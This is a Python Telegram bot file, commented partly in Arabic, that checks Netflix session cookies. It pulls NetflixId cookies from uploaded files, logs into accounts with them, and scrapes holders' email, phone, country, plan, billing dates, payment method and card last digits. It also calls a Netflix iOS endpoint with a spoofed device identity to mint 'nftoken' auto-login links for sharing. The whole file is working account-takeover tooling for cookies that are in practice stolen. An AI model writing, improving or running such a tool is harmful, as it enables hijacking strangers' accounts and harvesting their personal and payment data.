# NF.py - Netflix Cookies Checker Bot (Async + Full Features)
import os
import re
import json
import zipfile
import html
import time
import asyncio
from datetime import datetime
from io import BytesIO

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# ======================== توكن البوت ========================
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ======================== الإعدادات ========================
REQUEST_TIMEOUT = 30

# ======================== دوال NFToken ========================
async def create_nftoken_link(netflix_id):
    if not netflix_id:
        return None

    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

    params = {
        "appVersion": "15.48.1",
        "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"false","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        "device_type": "NFAPPL-02-",
        "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "idiom": "phone",
        "iosVersion": "15.8.5",
        "isTablet": "false",
        "languages": "en-US",
        "locale": "en-US",
        "maxDeviceWidth": "375",
        "model": "saget",
        "modelType": "IPHONE8-1",
        "odpAware": "true",
        "path": '["account","token","default"]',
        "pathFormat": "graph",
        "pixelDensity": "2.0",
        "progressive": "false",
        "responseFormat": "json",
    }

    headers = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.argo.abtests": "",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        "Cookie": f"NetflixId={netflix_id}",
    }

    try:
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            async with session.get(url, params=params, headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    token = None
                    try:
                        token = data.get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
                    except:
                        pass

                    if token:
                        return token
        return None
    except Exception:
        return None

def create_pc_link(token):
    if not token:
        return None
    return f"https://netflix.com/?nftoken={token}"

def create_mobile_link(token):
    if not token:
        return None
    return f"https://netflix.com/unsupported?nftoken={token}"

# ======================== دوال الفحص الأساسية ========================
def decode_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None

def country_to_flag(code):
    if not code:
        return ""
    code = code.strip().upper()
    if len(code) == 2 and code.isalpha():
        return "".join(chr(127397 + ord(ch)) for ch in code)
    return ""

def format_date(value):
    """إصلاح مشكلة التواريخ - بترجع التاريخ بصيغة واضحة"""
    if not value:
        return "Unknown"
    
    value_str = str(value).strip()
    
    # لو التاريخ بصيغة ISO (YYYY-MM-DD)
    iso_match = re.match(r'^(\d{4})-(\d{2})-(\d{2})', value_str)
    if iso_match:
        try:
            year, month, day = iso_match.groups()
            dt = datetime(int(year), int(month), int(day))
            return dt.strftime("%B %d, %Y")
        except:
            pass
    
    # لو التاريخ بصيغة Unix timestamp (milliseconds)
    if value_str.isdigit() and len(value_str) >= 10:
        try:
            ts = int(value_str)
            if len(value_str) == 13:  # milliseconds
                ts = ts / 1000
            dt = datetime.fromtimestamp(ts)
            # لو التاريخ بعيد جداً، يبقى مش timestamp صح
            if 2000 <= dt.year <= 2100:
                return dt.strftime("%B %d, %Y")
        except:
            pass
    
    # محاولات تنسيقات تانية
    for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d",
                "%m/%d/%Y", "%d/%m/%Y", "%B %d, %Y", "%b %d, %Y"):
        try:
            dt = datetime.strptime(value_str[:19], fmt)
            return dt.strftime("%B %d, %Y")
        except:
            pass
    
    return value_str

def parse_member_since(value):
    """إصلاح مشكلة Member Since"""
    if not value:
        return "Unknown"
    
    value_str = str(value).strip()
    
    # أولاً: لو تاريخ ISO
    iso_match = re.match(r'^(\d{4})-(\d{2})-(\d{2})', value_str)
    if iso_match:
        try:
            year, month, day = iso_match.groups()
            dt = datetime(int(year), int(month), int(day))
            return dt.strftime("%B %Y")
        except:
            pass
    
    # ثانياً: محاولة استخراج الشهر والسنة من النص
    value_decoded = decode_value(value_str) or value_str
    value_lower = value_decoded.lower()
    
    months_map = {
        'january': 'January', 'enero': 'January', 'janvier': 'January', 'janeiro': 'January',
        'february': 'February', 'febrero': 'February', 'fevrier': 'February', 'fevereiro': 'February',
        'march': 'March', 'marzo': 'March', 'mars': 'March',
        'april': 'April', 'abril': 'April', 'avril': 'April',
        'may': 'May', 'mayo': 'May', 'mai': 'May',
        'june': 'June', 'junio': 'June', 'juin': 'June',
        'july': 'July', 'julio': 'July', 'juillet': 'July',
        'august': 'August', 'agosto': 'August', 'aout': 'August',
        'september': 'September', 'septiembre': 'September', 'septembre': 'September',
        'october': 'October', 'octubre': 'October', 'octobre': 'October',
        'november': 'November', 'noviembre': 'November', 'novembre': 'November',
        'december': 'December', 'diciembre': 'December', 'decembre': 'December',
    }
    
    for mon_key, mon_name in months_map.items():
        if mon_key in value_lower:
            year_match = re.search(r'(19|20)\d{2}', value_decoded)
            if year_match:
                year = year_match.group()
                # ✅ نتأكد إن السنة منطقية (مش 2026 اللي ممكن تكون غلط)
                if 1997 <= int(year) <= 2025:
                    return f"{mon_name} {year}"
                else:
                    return f"{mon_name} {year}"
            return mon_name
    
    # ثالثاً: أرقام
    numbers = re.findall(r'\d+', value_decoded)
    if len(numbers) >= 2:
        # نجرب نلاقي سنة
        for num in numbers:
            if len(num) == 4 and 1997 <= int(num) <= 2025:
                return f"Year {num}"
    
    return value_decoded

def format_member_since(value):
    return parse_member_since(value) if value else "Unknown"

def format_membership_status(status):
    if not status:
        return "Active"
    status_lower = status.lower()
    if "current_member" in status_lower:
        return "Active"
    elif "former_member" in status_lower:
        return "Expired"
    elif "cancelled" in status_lower:
        return "Cancelled"
    elif "expired" in status_lower:
        return "Expired"
    elif "on_hold" in status_lower:
        return "On Hold"
    elif "past_due" in status_lower:
        return "Past Due"
    else:
        return status.title()

# ======================== دوال استخراج الكوكيز ========================
def extract_all_cookies_from_file(content):
    accounts = []

    if not content or not content.strip():
        return accounts

    # الطريقة 1: NetflixId
    pattern = r'NetflixId[=\t\s]+([^\s\n\t;]+)'
    all_matches = list(re.finditer(pattern, content))

    for match in all_matches:
        cookies = {}
        nf_value = match.group(1).strip('"')

        if any(acc['cookies'].get('NetflixId') == nf_value for acc in accounts):
            continue

        cookies['NetflixId'] = nf_value

        start = match.start()
        end = min(start + 500, len(content))
        nearby_text = content[start:end]

        snf_pattern = r'SecureNetflixId[=\t\s]+([^\s\n\t;]+)'
        snf_match = re.search(snf_pattern, nearby_text)
        if snf_match:
            cookies['SecureNetflixId'] = snf_match.group(1).strip('"')

        accounts.append({"cookies": cookies, "raw": f"account_{len(accounts)+1}"})

    # الطريقة 2: Netscape
    if not accounts:
        netscape_cookies = {}
        lines = content.split('\n')

        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            parts = line.split('\t')
            if len(parts) >= 7:
                name = parts[5]
                value = parts[6]

                if name == 'NetflixId':
                    netscape_cookies['NetflixId'] = value
                elif name == 'SecureNetflixId':
                    netscape_cookies['SecureNetflixId'] = value

        if netscape_cookies.get('NetflixId'):
            accounts.append({"cookies": netscape_cookies, "raw": "netscape_format"})

    # الطريقة 3: تقسيم
    if not accounts:
        parts = re.split(r'(?=NetflixId[=\t])', content)

        for part in parts:
            if not part.strip():
                continue

            cookies = {}

            nf_match = re.search(r'NetflixId[=\t]+([^\s\n\t;]+)', part)
            if nf_match:
                cookies["NetflixId"] = nf_match.group(1).strip('"')

            snf_match = re.search(r'SecureNetflixId[=\t]+([^\s\n\t;]+)', part)
            if snf_match:
                cookies["SecureNetflixId"] = snf_match.group(1).strip('"')

            if cookies.get("NetflixId"):
                if not any(acc['cookies'].get('NetflixId') == cookies['NetflixId'] for acc in accounts):
                    accounts.append({"cookies": cookies, "raw": part[:200]})

    return accounts

# ======================== دوال استخراج طريقة الدفع ========================
def extract_payment_method(html_content):
    payment_methods = []

    payment_match = re.search(r'"paymentMethod"\s*:\s*"([^"]+)"', html_content)
    if payment_match:
        method = decode_value(payment_match.group(1))
        if method and method not in payment_methods:
            payment_methods.append(method)

    payment_match = re.search(r'"paymentMethodType"\s*:\s*"([^"]+)"', html_content)
    if payment_match:
        method = decode_value(payment_match.group(1))
        if method and method not in payment_methods:
            payment_methods.append(method)

    billing_patterns = [
        r'<span[^>]*class="[^"]*payment[^"]*"[^>]*>([^<]+)</span>',
        r'<div[^>]*class="[^"]*payment-method[^"]*"[^>]*>([^<]+)</div>',
        r'<div[^>]*data-uia="payment-method"[^>]*>([^<]+)</div>',
        r'<span[^>]*data-uia="payment-method-label"[^>]*>([^<]+)</span>',
        r'ending in[^\d]*(\d{4})',
        r'(Visa|Mastercard|American Express|Amex|Discover|PayPal|Gift Card|Mobile Billing|Direct Debit|Prepaid Card)[^<]*',
        r'Credit/Debit Card.*?ending in[^\d]*(\d{4})',
    ]

    for pattern in billing_patterns:
        match = re.search(pattern, html_content, re.IGNORECASE)
        if match:
            if len(match.groups()) > 0 and match.group(1):
                method = decode_value(match.group(1))
            else:
                method = decode_value(match.group(0))

            if method and method not in payment_methods and len(method) > 2 and len(method) < 100:
                if 'ending in' in method.lower() or method.isdigit():
                    card_match = re.search(r'ending in[^\d]*(\d{4})', method, re.IGNORECASE)
                    if card_match:
                        method = f"Card ending in {card_match.group(1)}"
                payment_methods.append(method[:50])

    js_patterns = [
        r'paymentMethodDisplayName["\']?\s*:\s*["\']([^"\']+)',
        r'payment_info["\']?\s*:\s*{[^}]*method["\']?\s*:\s*["\']([^"\']+)',
        r'billingInfo["\']?\s*:\s*{[^}]*paymentType["\']?\s*:\s*["\']([^"\']+)',
        r'currentPaymentMethod["\']?\s*:\s*["\']([^"\']+)',
    ]

    for pattern in js_patterns:
        match = re.search(pattern, html_content, re.IGNORECASE)
        if match:
            method = decode_value(match.group(1))
            if method and method not in payment_methods and len(method) < 100:
                payment_methods.append(method)

    known_methods = ['PayPal', 'Visa', 'Mastercard', 'American Express', 'Amex', 'Discover',
                     'Gift Card', 'Mobile', 'Direct Debit', 'Prepaid', 'iTunes', 'Google Play',
                     'Bank Transfer', 'Sofort', 'IDEAL', 'Giropay']

    for method in known_methods:
        if re.search(r'\b' + re.escape(method) + r'\b', html_content, re.IGNORECASE):
            if method not in payment_methods:
                payment_methods.append(method)

    last_four_match = re.search(r'(\d{4})[^\d]*$', html_content)
    if last_four_match and not payment_methods:
        payment_methods.append(f"Card ending in {last_four_match.group(1)}")

    for method in payment_methods:
        if method and len(method) > 1:
            return method

    return None

# ======================== دوال استخراج البروفايلات (محسّنة) ========================
def _find_profile_names_in_json(obj, depth=0):
    """دالة recursive للبحث عن أسماء البروفايلات جوه JSON"""
    names = []
    if depth > 10:
        return names
    try:
        if isinstance(obj, dict):
            keys_lower = [str(k).lower() for k in obj.keys()]
            is_profile_obj = any('profile' in k or 'avatar' in k for k in keys_lower)

            if is_profile_obj:
                for key in ['name', 'profileName', 'displayName']:
                    if key in obj and isinstance(obj[key], str):
                        names.append(obj[key])

            for v in obj.values():
                names.extend(_find_profile_names_in_json(v, depth + 1))
        elif isinstance(obj, list):
            for item in obj:
                names.extend(_find_profile_names_in_json(item, depth + 1))
    except:
        pass
    return names

async def extract_all_profiles_from_manage(session):
    profiles = []

    def is_valid_profile(name):
        if not name:
            return False
        
        name_clean = str(name).strip()
        name_lower = name_clean.lower()
        
        # ✅ قائمة موسعة شاملة لأسماء UI والأدوار
        forbidden_exact = {
            # UI Elements
            'add', 'add profile', 'add a profile', 'add new', 'addnew', 'add new profile',
            'new', 'new profile', 'create', 'create profile', 'make a profile',
            'manage', 'manage profile', 'manage profiles', 'manage profiles:',
            'edit', 'edit profile', 'edit profiles',
            'delete', 'delete profile', 'remove', 'remove profile',
            'switch', 'switch profile', 'switch profiles',
            'see all', 'see more', 'show all', 'show more', 'view all', 'load more',
            'done', 'cancel', 'save', 'close', 'back', 'next', 'previous',
            'sign in', 'sign out', 'signin', 'signout', 'login', 'logout',
            'register', 'home', 'menu', 'help', 'support', 'contact',
            'profiles', 'profile', 'account', 'settings',
            'netflix', 'name', 'username', 'email',
            # Roles/Labels
            'admin', 'administrator', 'owner', 'master', 'primary', 'main',
            'secondary', 'default', 'guest', 'user', 'member', 'host',
            'moderator', 'mod', 'root', 'superuser', 'super admin', 'superadmin',
            # Arabic
            'اضافة', 'إضافة', 'اضافة بروفايل', 'إضافة بروفايل', 'اضف بروفايل',
            'اضف', 'تعديل', 'حذف', 'رجوع', 'خروج', 'حسابي',
            'ادارة الملفات', 'إدارة الملفات', 'الملف الشخصي',
            'الكل', 'الرئيسية', 'مساعدة',
        }
        
        # لو الاسم بالظبط في القائمة الممنوعة
        if name_lower in forbidden_exact:
            return False
        
        # لو الاسم فيه نقطتين في الآخر (زي "Manage Profiles:")
        if name_clean.rstrip().endswith(':'):
            return False
        
        # فلاتر أساسية
        if len(name_clean) < 1:
            return False
        if name_lower.startswith('http') or name_lower.startswith('www'):
            return False
        if name_clean.isdigit():
            return False
        if len(name_clean) > 40:
            return False
        
        # ✅ فحص الكلمات الممنوعة كـ substring
        forbidden_substrings = [
            'manage profile', 'edit profile', 'add profile', 'create profile',
            'switch profile', 'delete profile', 'remove profile',
            'see all', 'show all', 'view all', 'load more',
            'sign in', 'sign out', 'log in', 'log out',
            'administrator', 'super admin',
        ]
        
        for forbidden in forbidden_substrings:
            if forbidden in name_lower:
                return False
        
        # ✅ لو الاسم قصير (كلمتين أو أقل) وفيه كلمة UI
        words = name_lower.split()
        if len(words) <= 2:
            ui_words = {'manage', 'profile', 'profiles', 'edit', 'add', 'delete', 
                       'remove', 'switch', 'see', 'show', 'view', 'all', 'more',
                       'admin', 'owner', 'master', 'primary', 'default', 'guest'}
            if any(w in ui_words for w in words):
                return False
        
        return True

    async def extract_from_page(url):
        page_profiles = []
        try:
            async with session.get(url, allow_redirects=True) as resp:
                if resp.status != 200:
                    return page_profiles
                html_content = await resp.text()

            # لو الصفحة صفحة تسجيل دخول
            if "signin" in html_content.lower()[:2000] and "logout" not in html_content.lower():
                return page_profiles

            # ============ الطرق الأساسية ============

            # الطريقة 1: JSON "profiles" array
            profiles_match = re.search(r'"profiles"\s*:\s*\[(.*?)\](?=\s*[,\}])', html_content, re.DOTALL)
            if profiles_match:
                profiles_data = profiles_match.group(1)
                all_names = re.findall(r'"name"\s*:\s*"([^"]+)"', profiles_data)
                for name in all_names:
                    decoded = decode_value(name)
                    if is_valid_profile(decoded) and decoded not in page_profiles:
                        page_profiles.append(decoded)

            # الطريقة 2: "profileName"
            profile_matches = re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html_content)
            for match in profile_matches:
                pname = decode_value(match.group(1))
                if is_valid_profile(pname) and pname not in page_profiles:
                    page_profiles.append(pname)

            # الطريقة 3: profiles array + name
            if not page_profiles:
                alt_matches = re.finditer(r'"profiles"\s*:\s*\[.*?"name"\s*:\s*"([^"]+)"', html_content, re.DOTALL)
                for match in alt_matches:
                    pname = decode_value(match.group(1))
                    if is_valid_profile(pname) and pname not in page_profiles:
                        page_profiles.append(pname)

            # الطريقة 4: class profile-name
            profile_classes = [
                r'<span[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</span>',
                r'<div[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</div>',
                r'<a[^>]*class="[^"]*profile-link[^"]*"[^>]*>([^<]+)</a>',
                r'<div[^>]*data-profile-name[^>]*>([^<]+)</div>',
                r'<span[^>]*data-uia="profile-name"[^>]*>([^<]+)</span>',
                r'<div[^>]*aria-label="Profile[^"]*"[^>]*>([^<]+)</div>',
                r'<h1[^>]*class="[^"]*profile[^"]*"[^>]*>([^<]+)</h1>',
                r'<h2[^>]*class="[^"]*profile[^"]*"[^>]*>([^<]+)</h2>',
                r'<span[^>]*data-uia="profile-avatar-name"[^>]*>([^<]+)</span>',
                r'<div[^>]*class="[^"]*profile-avatar[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>',
                r'<p[^>]*class="[^"]*profile[^"]*name[^"]*"[^>]*>([^<]+)</p>',
                r'<span[^>]*class="[^"]*profileName[^"]*"[^>]*>([^<]+)</span>',
            ]

            for pattern in profile_classes:
                matches = re.finditer(pattern, html_content, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    pname = decode_value(match.group(1))
                    if is_valid_profile(pname) and pname not in page_profiles:
                        page_profiles.append(pname)

            # الطريقة 5: profileId + name
            if not page_profiles:
                alt_pattern = r'"profileId"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
                matches = re.finditer(alt_pattern, html_content)
                for match in matches:
                    pname = decode_value(match.group(1))
                    if is_valid_profile(pname) and pname not in page_profiles:
                        page_profiles.append(pname)

            # الطريقة 6: profileGuid + name
            if not page_profiles:
                alt_pattern2 = r'"profileGuid"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
                matches = re.finditer(alt_pattern2, html_content)
                for match in matches:
                    pname = decode_value(match.group(1))
                    if is_valid_profile(pname) and pname not in page_profiles:
                        page_profiles.append(pname)

            # الطريقة 7: profile + name
            if not page_profiles:
                alt_pattern3 = r'profile[^}]*?"name"\s*:\s*"([^"]+)"'
                matches = re.finditer(alt_pattern3, html_content, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    pname = decode_value(match.group(1))
                    if is_valid_profile(pname) and pname not in page_profiles:
                        page_profiles.append(pname)

            # الطريقة 8: alt + data-uia
            if not page_profiles:
                alt_pattern4 = r'alt="([^"]+)"[^>]*data-uia="profile'
                matches = re.finditer(alt_pattern4, html_content)
                for match in matches:
                    pname = decode_value(match.group(1))
                    if is_valid_profile(pname) and pname not in page_profiles:
                        page_profiles.append(pname)

            # الطريقة 9: option tags
            if not page_profiles:
                alt_pattern5 = r'<option[^>]*value="[^"]*"[^>]*>([^<]+)</option>'
                matches = re.finditer(alt_pattern5, html_content, re.IGNORECASE)
                for match in matches:
                    pname = decode_value(match.group(1))
                    if is_valid_profile(pname) and pname not in page_profiles:
                        page_profiles.append(pname)

            # الطريقة 10: aria-label Switch Profile
            if not page_profiles:
                alt_pattern6 = r'aria-label="[^"]*Profile[^"]*:\s*([^"]+)"'
                matches = re.finditer(alt_pattern6, html_content, re.IGNORECASE)
                for match in matches:
                    pname = decode_value(match.group(1))
                    if is_valid_profile(pname) and pname not in page_profiles:
                        page_profiles.append(pname)

            # الطريقة 11: "profileName" في script
            if not page_profiles:
                script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html_content, re.DOTALL)
                for script in script_matches:
                    if 'profile' in script.lower():
                        names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', script)
                        for n in names:
                            pname = decode_value(n)
                            if is_valid_profile(pname) and pname not in page_profiles:
                                page_profiles.append(pname)

            # الطريقة 12: name جوه object فيه profile
            if not page_profiles:
                json_blocks = re.findall(r'\{[^{}]*"profile[^{}]*\}', html_content, re.IGNORECASE)
                for block in json_blocks:
                    names = re.findall(r'"name"\s*:\s*"([^"]+)"', block)
                    for n in names:
                        pname = decode_value(n)
                        if is_valid_profile(pname) and pname not in page_profiles:
                            page_profiles.append(pname)

            # الطريقة 13: data attributes
            if not page_profiles:
                data_names = re.findall(r'data-[a-z-]*name="([^"]+)"', html_content, re.IGNORECASE)
                for n in data_names:
                    pname = decode_value(n)
                    if is_valid_profile(pname) and pname not in page_profiles:
                        page_profiles.append(pname)

            # الطريقة 14: __NEXT_DATA__
            if not page_profiles:
                next_data_match = re.search(r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.*?)</script>', html_content, re.DOTALL)
                if next_data_match:
                    try:
                        next_data = json.loads(next_data_match.group(1))
                        names = _find_profile_names_in_json(next_data)
                        for n in names:
                            pname = decode_value(n)
                            if is_valid_profile(pname) and pname not in page_profiles:
                                page_profiles.append(pname)
                    except:
                        pass

            # الطريقة 15: netflix react context
            if not page_profiles:
                react_match = re.search(r'netflix\.react\.context\s*=\s*(\{.*?\});', html_content, re.DOTALL)
                if react_match:
                    try:
                        ctx = json.loads(react_match.group(1))
                        names = _find_profile_names_in_json(ctx)
                        for n in names:
                            pname = decode_value(n)
                            if is_valid_profile(pname) and pname not in page_profiles:
                                page_profiles.append(pname)
                    except:
                        pass

        except Exception as e:
            pass

        return page_profiles

    # نجرب الصفحتين
    profiles = await extract_from_page("https://www.netflix.com/ManageProfiles")

    if not profiles:
        profiles = await extract_from_page("https://www.netflix.com/account/profiles")

    # تنظيف نهائي
    profiles = list(dict.fromkeys(profiles))
    profiles = [p for p in profiles if is_valid_profile(p)]

    return profiles

async def get_account_info(cookies):
    if not cookies or "NetflixId" not in cookies:
        return None, "Missing NetflixId"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    session_cookies = {"NetflixId": cookies["NetflixId"]}
    if "SecureNetflixId" in cookies:
        session_cookies["SecureNetflixId"] = cookies["SecureNetflixId"]

    try:
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            cookies=session_cookies,
            headers=headers
        ) as session:
            async with session.get("https://www.netflix.com/YourAccount", allow_redirects=True) as resp:
                if resp.status == 200:
                    html_content = await resp.text()

                    if "logout" not in html_content.lower() and "signin" in html_content.lower():
                        return None, "Not logged in - cookie expired"

                    info = {}

                    name_match = re.search(r'"firstName"\s*:\s*"([^"]+)"', html_content)
                    if name_match:
                        info["name"] = decode_value(name_match.group(1))
                    else:
                        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', html_content)
                        if name_match:
                            info["name"] = decode_value(name_match.group(1))

                    email = None
                    email_match = re.search(r'"email"\s*:\s*"([^"]+)"', html_content)
                    if email_match:
                        email = decode_value(email_match.group(1))
                    if not email:
                        email_match = re.search(r'"loginId"\s*:\s*"([^"]+)"', html_content)
                        if email_match:
                            email = decode_value(email_match.group(1))
                    if not email:
                        email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html_content)
                        if email_match:
                            email = decode_value(email_match.group(1))
                    if not email:
                        email_match = re.search(r'<span[^>]*class="[^"]*email[^"]*"[^>]*>([^<]+)</span>', html_content, re.IGNORECASE)
                        if email_match:
                            email = decode_value(email_match.group(1))
                    info["email"] = email

                    country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html_content)
                    if not country_match:
                        country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', html_content)
                    if country_match:
                        info["country"] = decode_value(country_match.group(1))

                    lang_match = re.search(r'"language"\s*:\s*"([^"]+)"', html_content)
                    if lang_match:
                        info["language"] = decode_value(lang_match.group(1))

                    member_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html_content)
                    if member_match:
                        info["memberSince"] = decode_value(member_match.group(1))

                    billing_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', html_content)
                    if billing_match:
                        info["nextBilling"] = decode_value(billing_match.group(1))
                    else:
                        billing_match = re.search(r'"nextBillingDate":\s*{[^}]*"date"\s*:\s*"([^"]+)"', html_content)
                        if billing_match:
                            info["nextBilling"] = decode_value(billing_match.group(1))

                    payment_method = extract_payment_method(html_content)
                    if payment_method:
                        info["payment"] = payment_method
                    else:
                        payment_match = re.search(r'"paymentMethod"\s*:\s*"([^"]+)"', html_content)
                        if payment_match:
                            info["payment"] = decode_value(payment_match.group(1))

                    phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html_content)
                    if phone_match:
                        info["phone"] = decode_value(phone_match.group(1))

                    phone_verified_match = re.search(r'"phoneVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
                    if phone_verified_match:
                        info["phone_verified"] = "Verified" if phone_verified_match.group(1).lower() == "true" else "Not Verified"

                    streams_match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', html_content)
                    if streams_match:
                        info["streams"] = streams_match.group(1)

                    hold_match = re.search(r'"holdStatus"\s*:\s*(true|false)', html_content, re.IGNORECASE)
                    info["hold"] = "Yes" if hold_match and hold_match.group(1).lower() == "true" else "No"

                    extra_match = re.search(r'"showExtraMemberSection"\s*:\s*(true|false)', html_content, re.IGNORECASE)
                    info["extra_member"] = "Yes" if extra_match and extra_match.group(1).lower() == "true" else "No"

                    email_verified_match = re.search(r'"emailVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
                    info["email_verified"] = "Yes" if email_verified_match and email_verified_match.group(1).lower() == "true" else "No"

                    status_match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html_content)
                    if status_match:
                        raw_status = decode_value(status_match.group(1))
                        info["status"] = format_membership_status(raw_status)
                    else:
                        info["status"] = "Active"

                    plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', html_content)
                    if not plan_match:
                        plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', html_content)
                    if plan_match:
                        info["plan"] = decode_value(plan_match.group(1))

                    quality_match = re.search(r'"videoQuality"\s*:\s*"([^"]+)"', html_content)
                    if quality_match:
                        info["quality"] = decode_value(quality_match.group(1))

                    profiles = await extract_all_profiles_from_manage(session)

                    if profiles:
                        info["profiles"] = profiles
                        info["profiles_count"] = len(profiles)
                        info["profiles_list"] = ", ".join(profiles)
                    else:
                        info["profiles"] = []
                        info["profiles_count"] = 0
                        info["profiles_list"] = "No profiles found"

                    return info, None

                return None, f"HTTP {resp.status}"

    except asyncio.TimeoutError:
        return None, "Request timed out"
    except Exception as e:
        return None, str(e)[:50]

def determine_plan(info):
    if not info:
        return "invalid", "Invalid", False

    plan_name = (info.get("plan") or "").lower()
    status = (info.get("status") or "").lower()
    quality = (info.get("quality") or "").lower()
    streams = info.get("streams", "")

    is_subscribed = False

    if "active" in status or "current_member" in status:
        is_subscribed = True
    elif "premium" in plan_name or "standard" in plan_name or "basic" in plan_name or "mobile" in plan_name:
        is_subscribed = True
    elif streams and streams.isdigit() and int(streams) > 0:
        is_subscribed = True

    if not is_subscribed:
        return "free", "Free", False

    if "premium" in plan_name:
        return "premium", "Premium", True
    elif "standard" in plan_name:
        if "ads" in plan_name:
            return "standard_with_ads", "Standard With Ads", True
        return "standard", "Standard", True
    elif "basic" in plan_name:
        return "basic", "Basic", True
    elif "mobile" in plan_name:
        return "mobile", "Mobile", True

    if "uhd" in quality or "4k" in quality:
        return "premium", "Premium", True
    elif "hd" in quality:
        return "standard", "Standard", True

    if streams and streams.isdigit():
        s = int(streams)
        if s >= 4:
            return "premium", "Premium", True
        elif s >= 2:
            return "standard", "Standard", True
        elif s == 1:
            return "basic", "Basic", True

    return "unknown", "Unknown", True

